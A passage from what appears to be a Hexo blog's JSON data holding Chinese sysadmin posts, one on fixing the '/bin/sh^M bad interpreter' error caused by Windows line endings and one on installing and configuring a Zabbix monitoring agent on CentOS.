class=\"line\">./startup.sh</span><br></pre></td></tr></table></figure>\n<p>&#x518D;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;http:localhost:8080&#xFF0C;&#x732B;&#x7684;&#x9875;&#x9762;&#x51FA;&#x6765;&#xFF0C;&#x8BF4;&#x660E;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x4E86;&#x3002;</p>\n"},{"title":"sh脚本异常,binsh^M bad interpreter No such file or directory","date":"2016-06-18T10:24:17.000Z","toc":false,"_content":"\n### 错误\n在Linux中执行.sh脚本，出现如下异常\n```bash\n/bin/sh^M: bad interpreter: No such file or directory\n```\n\n### 原因\n在windows系统中编辑的.sh文件可能有不可见字符，所以在Linux系统下执行会报以上异常信息。\n\n--- \n\n### 解决\n\n#### 在windows下转换： \n利用一些编辑器如UltraEdit或EditPlus等工具先将脚本编码转换，再放到Linux中执行。\n转换方式如下（UltraEdit）：File-->Conversions-->DOS->UNIX即可。 \n\n#### 在Linux下转换： \n首先要确保文件有可执行权限\n```bash\nchmod a+x filename\n```\n\n然后修改文件格式\n利用如下命令查看文件格式 \n```bash\nvi filename\n:set ff 或 :set fileformat \n```\n\n可以看到如下信息\n```bash\nfileformat=dos 或 fileformat=unix \n```\n\n利用如下命令修改文件格式 \n```bash\n:set ff=unix 或 :set fileformat=unix \n:wq (存盘退出)\n```\n最后再执行文件 \n\n```bash\n./filename\n```","source":"_posts/sh脚本异常,binsh^M bad interpreter No such file or directory.md","raw":"---\ntitle: sh脚本异常,binsh^M bad interpreter No such file or directory\ncategories:\n  - 错误集锦\ndate: 2016-6-18 18:24:17\ntoc: false\n---\n\n### 错误\n在Linux中执行.sh脚本，出现如下异常\n```bash\n/bin/sh^M: bad interpreter: No such file or directory\n```\n\n### 原因\n在windows系统中编辑的.sh文件可能有不可见字符，所以在Linux系统下执行会报以上异常信息。\n\n--- \n\n### 解决\n\n#### 在windows下转换： \n利用一些编辑器如UltraEdit或EditPlus等工具先将脚本编码转换，再放到Linux中执行。\n转换方式如下（UltraEdit）：File-->Conversions-->DOS->UNIX即可。 \n\n#### 在Linux下转换： \n首先要确保文件有可执行权限\n```bash\nchmod a+x filename\n```\n\n然后修改文件格式\n利用如下命令查看文件格式 \n```bash\nvi filename\n:set ff 或 :set fileformat \n```\n\n可以看到如下信息\n```bash\nfileformat=dos 或 fileformat=unix \n```\n\n利用如下命令修改文件格式 \n```bash\n:set ff=unix 或 :set fileformat=unix \n:wq (存盘退出)\n```\n最后再执行文件 \n\n```bash\n./filename\n```","slug":"sh脚本异常,binsh^M bad interpreter No such file or directory","published":1,"updated":"2016-11-17T11:59:42.674Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruld10039gwtm6js8hhlr","content":"<h3 id=\"&#x9519;&#x8BEF;\"><a href=\"#&#x9519;&#x8BEF;\" class=\"headerlink\" title=\"&#x9519;&#x8BEF;\"></a>&#x9519;&#x8BEF;</h3><p>&#x5728;Linux&#x4E2D;&#x6267;&#x884C;.sh&#x811A;&#x672C;&#xFF0C;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x5F02;&#x5E38;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/sh^M: bad interpreter: No such file or directory</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x539F;&#x56E0;\"><a href=\"#&#x539F;&#x56E0;\" class=\"headerlink\" title=\"&#x539F;&#x56E0;\"></a>&#x539F;&#x56E0;</h3><p>&#x5728;windows&#x7CFB;&#x7EDF;&#x4E2D;&#x7F16;&#x8F91;&#x7684;.sh&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x6709;&#x4E0D;&#x53EF;&#x89C1;&#x5B57;&#x7B26;&#xFF0C;&#x6240;&#x4EE5;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E0B;&#x6267;&#x884C;&#x4F1A;&#x62A5;&#x4EE5;&#x4E0A;&#x5F02;&#x5E38;&#x4FE1;&#x606F;&#x3002;</p>\n<hr>\n<h3 id=\"&#x89E3;&#x51B3;\"><a href=\"#&#x89E3;&#x51B3;\" class=\"headerlink\" title=\"&#x89E3;&#x51B3;\"></a>&#x89E3;&#x51B3;</h3><h4 id=\"&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\"><a href=\"#&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\" class=\"headerlink\" title=\"&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\"></a>&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;</h4><p>&#x5229;&#x7528;&#x4E00;&#x4E9B;&#x7F16;&#x8F91;&#x5668;&#x5982;UltraEdit&#x6216;EditPlus&#x7B49;&#x5DE5;&#x5177;&#x5148;&#x5C06;&#x811A;&#x672C;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#xFF0C;&#x518D;&#x653E;&#x5230;Linux&#x4E2D;&#x6267;&#x884C;&#x3002;<br>&#x8F6C;&#x6362;&#x65B9;&#x5F0F;&#x5982;&#x4E0B;&#xFF08;UltraEdit&#xFF09;&#xFF1A;File&#x2013;&gt;Conversions&#x2013;&gt;DOS-&gt;UNIX&#x5373;&#x53EF;&#x3002; </p>\n<h4 id=\"&#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\"><a href=\"#&#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\" class=\"headerlink\" title=\"&#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\"></a>&#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;</h4><p>&#x9996;&#x5148;&#x8981;&#x786E;&#x4FDD;&#x6587;&#x4EF6;&#x6709;&#x53EF;&#x6267;&#x884C;&#x6743;&#x9650;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod a+x filename</span><br></pre></td></tr></table></figure></p>\n<p>&#x7136;&#x540E;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x683C;&#x5F0F;<br>&#x5229;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x683C;&#x5F0F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi filename</span><br><span class=\"line\">:<span class=\"built_in\">set</span> ff &#x6216; :<span class=\"built_in\">set</span> fileformat</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x4FE1;&#x606F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fileformat=dos &#x6216; fileformat=unix</span><br></pre></td></tr></table></figure></p>\n<p>&#x5229;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x683C;&#x5F0F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">:<span class=\"built_in\">set</span> ff=unix &#x6216; :<span class=\"built_in\">set</span> fileformat=unix </span><br><span class=\"line\">:wq (&#x5B58;&#x76D8;&#x9000;&#x51FA;)</span><br></pre></td></tr></table></figure></p>\n<p>&#x6700;&#x540E;&#x518D;&#x6267;&#x884C;&#x6587;&#x4EF6; </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./filename</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h3 id=\"&#x9519;&#x8BEF;\"><a href=\"#&#x9519;&#x8BEF;\" class=\"headerlink\" title=\"&#x9519;&#x8BEF;\"></a>&#x9519;&#x8BEF;</h3><p>&#x5728;Linux&#x4E2D;&#x6267;&#x884C;.sh&#x811A;&#x672C;&#xFF0C;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x5F02;&#x5E38;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/sh^M: bad interpreter: No such file or directory</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x539F;&#x56E0;\"><a href=\"#&#x539F;&#x56E0;\" class=\"headerlink\" title=\"&#x539F;&#x56E0;\"></a>&#x539F;&#x56E0;</h3><p>&#x5728;windows&#x7CFB;&#x7EDF;&#x4E2D;&#x7F16;&#x8F91;&#x7684;.sh&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x6709;&#x4E0D;&#x53EF;&#x89C1;&#x5B57;&#x7B26;&#xFF0C;&#x6240;&#x4EE5;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E0B;&#x6267;&#x884C;&#x4F1A;&#x62A5;&#x4EE5;&#x4E0A;&#x5F02;&#x5E38;&#x4FE1;&#x606F;&#x3002;</p>\n<hr>\n<h3 id=\"&#x89E3;&#x51B3;\"><a href=\"#&#x89E3;&#x51B3;\" class=\"headerlink\" title=\"&#x89E3;&#x51B3;\"></a>&#x89E3;&#x51B3;</h3><h4 id=\"&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\"><a href=\"#&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\" class=\"headerlink\" title=\"&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\"></a>&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;</h4><p>&#x5229;&#x7528;&#x4E00;&#x4E9B;&#x7F16;&#x8F91;&#x5668;&#x5982;UltraEdit&#x6216;EditPlus&#x7B49;&#x5DE5;&#x5177;&#x5148;&#x5C06;&#x811A;&#x672C;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#xFF0C;&#x518D;&#x653E;&#x5230;Linux&#x4E2D;&#x6267;&#x884C;&#x3002;<br>&#x8F6C;&#x6362;&#x65B9;&#x5F0F;&#x5982;&#x4E0B;&#xFF08;UltraEdit&#xFF09;&#xFF1A;File&#x2013;&gt;Conversions&#x2013;&gt;DOS-&gt;UNIX&#x5373;&#x53EF;&#x3002; </p>\n<h4 id=\"&#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\"><a href=\"#&#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\" class=\"headerlink\" title=\"&#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;\"></a>&#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;</h4><p>&#x9996;&#x5148;&#x8981;&#x786E;&#x4FDD;&#x6587;&#x4EF6;&#x6709;&#x53EF;&#x6267;&#x884C;&#x6743;&#x9650;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod a+x filename</span><br></pre></td></tr></table></figure></p>\n<p>&#x7136;&#x540E;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x683C;&#x5F0F;<br>&#x5229;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x683C;&#x5F0F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi filename</span><br><span class=\"line\">:<span class=\"built_in\">set</span> ff &#x6216; :<span class=\"built_in\">set</span> fileformat</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x4FE1;&#x606F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fileformat=dos &#x6216; fileformat=unix</span><br></pre></td></tr></table></figure></p>\n<p>&#x5229;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x683C;&#x5F0F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">:<span class=\"built_in\">set</span> ff=unix &#x6216; :<span class=\"built_in\">set</span> fileformat=unix </span><br><span class=\"line\">:wq (&#x5B58;&#x76D8;&#x9000;&#x51FA;)</span><br></pre></td></tr></table></figure></p>\n<p>&#x6700;&#x540E;&#x518D;&#x6267;&#x884C;&#x6587;&#x4EF6; </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./filename</span><br></pre></td></tr></table></figure>"},{"title":"zabbix agent安装详解","date":"2016-09-24T10:24:17.000Z","toc":false,"_content":"\n## 安装\n### Installing repository configuration package\n\nZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5:\n\n```bash\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm\n```\n\nZabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:\n```bash\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm\n```\n\nZabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:\n```bash\t\t\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm\n```\n\n<!-- more -->\n\n### Installing Zabbix packages\n\nExample for installing Zabbix agent only.\n```bash\nyum install zabbix-agent\n```\n\n<br/>\n\n---\n\n## 配置文件修改\n\n查找配置文件地址，并事先做好相关备份\n```bash\nfind / -name '*zabbix_agentd.conf*'\n# /etc/zabbix/zabbix_agentd.conf\ncp /etc/zabbix/zabbix_agentd.conf /etc/zabbix/zabbix_agentd.conf.bak\n```\n\n修改相关具体项\n```bash\n# vim /etc/zabbix/zabbix_agentd.conf\n\nEnableRemoteCommands=1  来至zabbix服务器的远程命令是否允许被执行\nServer=zabbix_server_IP  zabbix服务器ip地址\nServerActive=zabbix_server_IP  主动向zabbix server发送监控内容\nHostname=name  name配置的内容要和zabbix服务器配置的Host name一致\nUnsafeUserParameters=1  是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key\n```\n\n开机自启动\n```bash\nchkconfig zabbix-agent on\nchkconfig --list|grep zabbix-agent\n```\n\n启动客户端\n```bash\nservice zabbix-agent start\n```\n\n<br/>\n\n---\n\n## 服务器添加被监控主机\n登陆 http://zabbix_server_ip/zabbix, 点击 【组态】->【主机】->【创建主机】\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/1.png)\n\n配置主机名称【host name】、群组、被监控主机ip\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/2.png)\n\n添加监控模板并保存\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/3.png)\n\n回到被监控的主机列表，点击【项目】\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/4.png)\n\n查看刚才添加的模板所对应的监控项是否生效，绿色代表成功。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/5.png)\n\n也可以在主机列表点击【图形】, 进入某个具体监控项后，再点击【预览】，查看相关监控图像。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/6.png)\n\n<br/>\n\n\n\n","source":"_posts/zabbix agent安装详解.md","raw":"---\ntitle: zabbix agent安装详解\ncategories:\n  - 运维部署\ntags:\n  - zabbix\ndate: 2016-9-24 18:24:17\ntoc: false\n---\n\n## 安装\n### Installing repository configuration package\n\nZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5:\n\n```bash\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm\n```\n\nZabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:\n```bash\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm\n```\n\nZabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:\n```bash\t\t\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm\n```\n\n<!-- more -->\n\n### Installing Zabbix packages\n\nExample for installing Zabbix agent only.\n```bash\nyum install zabbix-agent\n```\n\n<br/>\n\n---\n\n## 配置文件修改\n\n查找配置文件地址，并事先做好相关备份\n```bash\nfind / -name '*zabbix_agentd.conf*'\n# /etc/zabbix/zabbix_agentd.conf\ncp /etc/zabbix/zabbix_agentd.conf /etc/zabbix/zabbix_agentd.conf.bak\n```\n\n修改相关具体项\n```bash\n# vim /etc/zabbix/zabbix_agentd.conf\n\nEnableRemoteCommands=1  来至zabbix服务器的远程命令是否允许被执行\nServer=zabbix_server_IP  zabbix服务器ip地址\nServerActive=zabbix_server_IP  主动向zabbix server发送监控内容\nHostname=name  name配置的内容要和zabbix服务器配置的Host name一致\nUnsafeUserParameters=1  是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key\n```\n\n开机自启动\n```bash\nchkconfig zabbix-agent on\nchkconfig --list|grep zabbix-agent\n```\n\n启动客户端\n```bash\nservice zabbix-agent start\n```\n\n<br/>\n\n---\n\n## 服务器添加被监控主机\n登陆 http://zabbix_server_ip/zabbix, 点击 【组态】->【主机】->【创建主机】\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/1.png)\n\n配置主机名称【host name】、群组、被监控主机ip\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/2.png)\n\n添加监控模板并保存\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/3.png)\n\n回到被监控的主机列表，点击【项目】\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/4.png)\n\n查看刚才添加的模板所对应的监控项是否生效，绿色代表成功。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/5.png)\n\n也可以在主机列表点击【图形】, 进入某个具体监控项后，再点击【预览】，查看相关监控图像。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/6.png)\n\n<br/>\n\n\n\n","slug":"zabbix agent安装详解","published":1,"updated":"2016-11-18T01:17:04.156Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruld3003cgwtmjuun421g","content":"<h2 id=\"&#x5B89;&#x88C5;\"><a href=\"#&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;\"></a>&#x5B89;&#x88C5;</h2><h3 id=\"Installing-repository-configuration-package\"><a href=\"#Installing-repository-configuration-package\" class=\"headerlink\" title=\"Installing repository configuration package\"></a>Installing repository configuration package</h3><p>Zabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm</span><br></pre></td></tr></table></figure>\n<p>Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm</span><br></pre></td></tr></table></figure></p>\n<p>Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h3 id=\"Installing-Zabbix-packages\"><a href=\"#Installing-Zabbix-packages\" class=\"headerlink\" title=\"Installing Zabbix packages\"></a>Installing Zabbix packages</h3><p>Example for installing Zabbix agent only.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install zabbix-agent</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<hr>\n<h2 id=\"&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;\"><a href=\"#&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;\" class=\"headerlink\" title=\"&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;\"></a>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;</h2><p>&#x67E5;&#x627E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x4E8B;&#x5148;&#x505A;&#x597D;&#x76F8;&#x5173;&#x5907;&#x4EFD;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name <span class=\"string\">&apos;*zabbix_agentd.conf*&apos;</span></span><br><span class=\"line\"><span class=\"comment\"># /etc/zabbix/zabbix_agentd.conf</span></span><br><span class=\"line\">cp /etc/zabbix/zabbix_agentd.conf /etc/zabbix/zabbix_agentd.conf.bak</span><br></pre></td></tr></table></figure></p>\n<p>&#x4FEE;&#x6539;&#x76F8;&#x5173;&#x5177;&#x4F53;&#x9879;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/zabbix/zabbix_agentd.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\">EnableRemoteCommands=1  &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;</span><br><span class=\"line\">Server=zabbix_server_IP  zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;</span><br><span class=\"line\">ServerActive=zabbix_server_IP  &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;</span><br><span class=\"line\">Hostname=name  name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;</span><br><span class=\"line\">UnsafeUserParameters=1  &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key</span><br></pre></td></tr></table></figure></p>\n<p>&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkconfig zabbix-agent on</span><br><span class=\"line\">chkconfig --list|grep zabbix-agent</span><br></pre></td></tr></table></figure></p>\n<p>&#x542F;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service zabbix-agent start</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<hr>\n<h2 id=\"&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;\"><a href=\"#&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;\" class=\"headerlink\" title=\"&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;\"></a>&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;</h2><p>&#x767B;&#x9646; <a href=\"http://zabbix_server_ip/zabbix\" target=\"_blank\" rel=\"external\">http://zabbix_server_ip/zabbix</a>, &#x70B9;&#x51FB; &#x3010;&#x7EC4;&#x6001;&#x3011;-&gt;&#x3010;&#x4E3B;&#x673A;&#x3011;-&gt;&#x3010;&#x521B;&#x5EFA;&#x4E3B;&#x673A;&#x3011;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/1.png\" alt=\"\"></p>\n<p>&#x914D;&#x7F6E;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3010;host name&#x3011;&#x3001;&#x7FA4;&#x7EC4;&#x3001;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;ip</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/2.png\" alt=\"\"></p>\n<p>&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x5E76;&#x4FDD;&#x5B58;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/3.png\" alt=\"\"></p>\n<p>&#x56DE;&#x5230;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x4E3B;&#x673A;&#x5217;&#x8868;&#xFF0C;&#x70B9;&#x51FB;&#x3010;&#x9879;&#x76EE;&#x3011;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/4.png\" alt=\"\"></p>\n<p>&#x67E5;&#x770B;&#x521A;&#x624D;&#x6DFB;&#x52A0;&#x7684;&#x6A21;&#x677F;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x76D1;&#x63A7;&#x9879;&#x662F;&#x5426;&#x751F;&#x6548;&#xFF0C;&#x7EFF;&#x8272;&#x4EE3;&#x8868;&#x6210;&#x529F;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/5.png\" alt=\"\"></p>\n<p>&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x4E3B;&#x673A;&#x5217;&#x8868;&#x70B9;&#x51FB;&#x3010;&#x56FE;&#x5F62;&#x3011;, &#x8FDB;&#x5165;&#x67D0;&#x4E2A;&#x5177;&#x4F53;&#x76D1;&#x63A7;&#x9879;&#x540E;&#xFF0C;&#x518D;&#x70B9;&#x51FB;&#x3010;&#x9884;&#x89C8;&#x3011;&#xFF0C;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x76D1;&#x63A7;&#x56FE;&#x50CF;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/6.png\" alt=\"\"></p>\n<p><br></p>\n","excerpt":"<h2 id=\"&#x5B89;&#x88C5;\"><a href=\"#&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;\"></a>&#x5B89;&#x88C5;</h2><h3 id=\"Installing-repository-configuration-package\"><a href=\"#Installing-repository-configuration-package\" class=\"headerlink\" title=\"Installing repository configuration package\"></a>Installing repository configuration package</h3><p>Zabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span 